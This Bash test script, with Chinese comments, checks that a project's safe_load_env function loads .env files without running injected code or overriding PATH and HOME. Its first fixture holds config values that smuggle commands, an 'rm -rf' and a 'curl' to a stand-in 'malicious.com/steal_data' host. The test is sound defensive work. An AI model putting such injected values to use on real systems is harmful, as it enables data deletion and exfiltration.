#!/bin/bash

# 配置安全测试
# 测试环境变量加载的安全性

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# 获取项目根目录
PROJECT_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"

echo "🔒 配置安全测试"
echo "=============="

# 创建测试用的临时目录
TEST_DIR="/tmp/coderocket_security_test"
mkdir -p "$TEST_DIR"

# 测试1: 恶意配置文件注入测试
echo "🔍 测试1: 配置文件注入防护..."

# 创建包含恶意代码的配置文件
cat > "$TEST_DIR/.env" << 'EOF'
# 正常配置
AI_SERVICE=gemini
GITLAB_API_URL=https://gitlab.com/api/v4

# 恶意代码注入尝试
AI_TIMEOUT=30; rm -rf /tmp/test_file; echo "malicious_code_executed"
GEMINI_API_KEY=key123; curl http://malicious.com/steal_data

# 包含等号的正常值
COMPLEX_VALUE=key=value=test
EOF

# 创建测试文件来验证是否被删除
touch /tmp/test_file

# 导入安全的环境变量加载函数
source "$PROJECT_ROOT/install-hooks.sh"

# 测试安全加载函数
echo "  - 测试安全的环境变量加载..."

# 在当前目录测试
cd "$TEST_DIR"
safe_load_env "$TEST_DIR/.env"

# 检查恶意代码是否被执行
if [ -f "/tmp/test_file" ]; then
    echo -e "  ${GREEN}✓ 恶意代码未被执行（文件仍存在）${NC}"
else
    echo -e "  ${RED}✗ 恶意代码被执行（文件被删除）${NC}"
fi

# 检查网络请求是否被阻止（通过检查进程）
if ! pgrep -f "curl.*malicious.com" > /dev/null; then
    echo -e "  ${GREEN}✓ 恶意网络请求未被执行${NC}"
else
    echo -e "  ${RED}✗ 恶意网络请求被执行${NC}"
fi

# 检查正常配置是否被正确加载
if [ "$AI_SERVICE" = "gemini" ]; then
    echo -e "  ${GREEN}✓ 正常配置被正确加载${NC}"
else
    echo -e "  ${RED}✗ 正常配置加载失败${NC}"
fi

# 检查包含等号的值是否被正确处理
if [ "$COMPLEX_VALUE" = "key=value=test" ]; then
    echo -e "  ${GREEN}✓ 包含等号的值被正确处理${NC}"
else
    echo -e "  ${RED}✗ 包含等号的值处理错误: '$COMPLEX_VALUE'${NC}"
fi

# 测试2: 配置文件权限检查
echo ""
echo "🔍 测试2: 配置文件权限检查..."

# 创建权限不安全的配置文件
cat > "$TEST_DIR/.env_unsafe" << 'EOF'
AI_SERVICE=gemini
GEMINI_API_KEY=unsafe_key
EOF

# 设置不安全的权限（全局可读写）
chmod 666 "$TEST_DIR/.env_unsafe"

# 检查是否有工具来检测不安全的权限
if [ -f "$TEST_DIR/.env_unsafe" ]; then
    file_perms=$(stat -f "%A" "$TEST_DIR/.env_unsafe" 2>/dev/null || stat -c "%a" "$TEST_DIR/.env_unsafe" 2>/dev/null)
    if [ "$file_perms" = "666" ]; then
        echo -e "  ${YELLOW}⚠ 检测到不安全的配置文件权限: $file_perms${NC}"
        echo -e "  ${YELLOW}  建议: 配置文件权限应设置为 600 或 644${NC}"
    fi
fi

# 测试3: 环境变量过滤测试
echo ""
echo "🔍 测试3: 环境变量过滤测试..."

# 创建包含不同类型变量的配置文件
cat > "$TEST_DIR/.env_filter" << 'EOF'
# 应该被加载的变量
AI_SERVICE=test_service
GITLAB_TOKEN=test_token
GEMINI_API_KEY=test_key
CLAUDECODE_MODEL=test_model
REVIEW_TIMING=post-commit

# 不应该被加载的变量
PATH=/malicious/path
HOME=/tmp/fake_home
SHELL=/bin/malicious_shell
RANDOM_VAR=should_not_load
EOF

# 记录原始变量
ORIGINAL_PATH="$PATH"
ORIGINAL_HOME="$HOME"

# 加载配置
safe_load_env "$TEST_DIR/.env_filter"

# 检查只有允许的变量被加载
if [ "$AI_SERVICE" = "test_service" ]; then
    echo -e "  ${GREEN}✓ AI_SERVICE 被正确加载${NC}"
else
    echo -e "  ${RED}✗ AI_SERVICE 加载失败${NC}"
fi

# 检查系统变量没有被覆盖
if [ "$PATH" = "$ORIGINAL_PATH" ]; then
    echo -e "  ${GREEN}✓ PATH 变量未被恶意覆盖${NC}"
else
    echo -e "  ${RED}✗ PATH 变量被恶意覆盖${NC}"
fi

if [ "$HOME" = "$ORIGINAL_HOME" ]; then
    echo -e "  ${GREEN}✓ HOME 变量未被恶意覆盖${NC}"
else
    echo -e "  ${RED}✗ HOME 变量被恶意覆盖${NC}"
fi

# 检查随机变量没有被加载
if [ -z "$RANDOM_VAR" ]; then
    echo -e "  ${GREEN}✓ 随机变量被正确过滤${NC}"
else
    echo -e "  ${RED}✗ 随机变量未被过滤: $RANDOM_VAR${NC}"
fi

# 清理测试文件
echo ""
echo "🧹 清理测试文件..."
rm -rf "$TEST_DIR"
rm -f /tmp/test_file

echo -e "${GREEN}🎉 配置安全测试完成${NC}"
